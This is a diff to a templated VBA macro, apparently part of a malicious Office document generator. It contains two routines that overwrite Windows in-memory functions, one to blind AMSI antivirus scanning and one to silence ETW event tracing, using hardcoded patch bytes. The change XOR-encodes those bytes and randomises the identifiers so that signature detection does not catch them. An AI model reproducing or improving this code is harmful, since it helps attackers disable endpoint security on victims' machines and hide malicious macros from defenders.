@@ -32,9 +32,11 @@ Private Sub {{ v.fn_amsi_patch }}()
     If scanAddr = 0 Then Exit Sub
     Dim oldP As Long
     {{ v.fn_callwp }} {{ v.fn_vprotect }}, scanAddr, 6, &H40, VarPtr(oldP)
-    Dim patch(0 To 5) As Byte
-    patch(0) = &HB8: patch(1) = &H57: patch(2) = &H0: patch(3) = &H7: patch(4) = &H80: patch(5) = &HC3
-    {{ v.fn_callwp }} {{ v.fn_movemem }}, scanAddr, VarPtr(patch(0)), 6, 0
+    Dim {{ v.var_amsi_patch }}(0 To 5) As Byte
+    {{ v.var_amsi_patch }}(0) = &H{{ amsi_enc_bytes[0] }}: {{ v.var_amsi_patch }}(1) = &H{{ amsi_enc_bytes[1] }}: {{ v.var_amsi_patch }}(2) = &H{{ amsi_enc_bytes[2] }}: {{ v.var_amsi_patch }}(3) = &H{{ amsi_enc_bytes[3] }}: {{ v.var_amsi_patch }}(4) = &H{{ amsi_enc_bytes[4] }}: {{ v.var_amsi_patch }}(5) = &H{{ amsi_enc_bytes[5] }}
+    Dim {{ v.var_amsi_xk }} As Byte: {{ v.var_amsi_xk }} = &H{{ amsi_xor_key }}
+    Dim {{ v.var_amsi_pi }} As Long: For {{ v.var_amsi_pi }} = 0 To 5: {{ v.var_amsi_patch }}({{ v.var_amsi_pi }}) = {{ v.var_amsi_patch }}({{ v.var_amsi_pi }}) Xor {{ v.var_amsi_xk }}: Next
+    {{ v.fn_callwp }} {{ v.fn_movemem }}, scanAddr, VarPtr({{ v.var_amsi_patch }}(0)), 6, 0
     {{ v.fn_callwp }} {{ v.fn_vprotect }}, scanAddr, 6, oldP, VarPtr(oldP)
 End Sub
 
@@ -48,9 +50,11 @@ Private Sub {{ v.fn_etw_patch }}()
     If etwAddr = 0 Then Exit Sub
     Dim oldP As Long
     {{ v.fn_callwp }} {{ v.fn_vprotect }}, etwAddr, 4, &H40, VarPtr(oldP)
-    Dim p(0 To 3) As Byte
-    p(0) = &H31: p(1) = &HC0: p(2) = &HC3: p(3) = &H90
-    {{ v.fn_callwp }} {{ v.fn_movemem }}, etwAddr, VarPtr(p(0)), 4, 0
+    Dim {{ v.var_etw_patch }}(0 To 3) As Byte
+    {{ v.var_etw_patch }}(0) = &H{{ etw_enc_bytes[0] }}: {{ v.var_etw_patch }}(1) = &H{{ etw_enc_bytes[1] }}: {{ v.var_etw_patch }}(2) = &H{{ etw_enc_bytes[2] }}: {{ v.var_etw_patch }}(3) = &H{{ etw_enc_bytes[3] }}
+    Dim {{ v.var_etw_xk }} As Byte: {{ v.var_etw_xk }} = &H{{ etw_xor_key }}
+    Dim {{ v.var_etw_pi }} As Long: For {{ v.var_etw_pi }} = 0 To 3: {{ v.var_etw_patch }}({{ v.var_etw_pi }}) = {{ v.var_etw_patch }}({{ v.var_etw_pi }}) Xor {{ v.var_etw_xk }}: Next
+    {{ v.fn_callwp }} {{ v.fn_movemem }}, etwAddr, VarPtr({{ v.var_etw_patch }}(0)), 4, 0
     {{ v.fn_callwp }} {{ v.fn_vprotect }}, etwAddr, 4, oldP, VarPtr(oldP)
 End Sub
 
